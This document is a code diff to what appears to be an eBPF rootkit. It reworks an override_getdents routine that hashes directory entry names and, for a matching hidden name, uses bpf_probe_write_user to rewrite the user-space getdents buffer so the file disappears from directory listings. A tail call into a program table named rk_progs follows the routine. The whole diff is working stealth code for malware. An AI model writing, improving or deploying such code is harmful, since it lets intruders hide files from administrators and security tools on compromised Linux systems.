@@ -62,46 +62,49 @@ int override_getdents(struct pt_regs *ctx)
     char buff[256] = {};
     u64 hash;
 
+    unsigned short reclen = 0;
+
 #pragma unroll
-    for (int i = 0; i != 200; i++)
+    for (int i = 0; i != 100; i++)
     {
-        if (getdents->read <= size)
+        if (!getdents->src)
         {
             bpf_probe_read_str(buff, sizeof(buff), (void *)getdents->dirent->d_name);
 
             hash = FNV_BASIS;
             update_hash_str(&hash, buff);
 
-            unsigned short reclen;
             bpf_probe_read(&reclen, sizeof(reclen), (void *)&getdents->dirent->d_reclen);
 
-            getdents->read += reclen;
             if (hash == getdents->hidden_hash)
             {
                 getdents->reclen = reclen;
                 getdents->src = (void *)getdents->dirent + reclen;
             }
+        }
+        getdents->read += reclen;
 
-            if (getdents->src && getdents->dirent != getdents->src)
+        if (getdents->read < size && getdents->src && getdents->dirent != getdents->src)
+        {
+            struct linux_dirent64 src;
+            bpf_probe_read(&src, sizeof(src), getdents->src);
+            src.d_off -= reclen;
+
+            bpf_probe_write_user((void *)getdents->dirent, &src, sizeof(src));
+
+            int remains = src.d_reclen - sizeof(struct linux_dirent64);
+            if (remains > 0)
             {
-                struct linux_dirent64 src;
-                bpf_probe_read(&src, sizeof(src), getdents->src);
-
-                src.d_off -= reclen;
-                bpf_probe_write_user((void *)getdents->dirent, &src, sizeof(src));
-
                 bpf_probe_read(buff, sizeof(buff), getdents->src + sizeof(struct linux_dirent64));
-
-                int remains = src.d_reclen - sizeof(struct linux_dirent64);
                 // currenlty doesn't support file longer than 220
                 copy((void *)getdents->dirent + sizeof(struct linux_dirent64), buff, remains);
-
-                getdents->src = (void *)getdents->src + src.d_reclen;
-                reclen = src.d_reclen;
             }
 
-            getdents->dirent = (void *)getdents->dirent + reclen;
+            getdents->src = (void *)getdents->src + src.d_reclen;
+            reclen = src.d_reclen;
         }
+
+        getdents->dirent = (void *)getdents->dirent + reclen;
     }
 
     bpf_tail_call(ctx, &rk_progs, OVERRIDE_GET_DENTS_PROG);
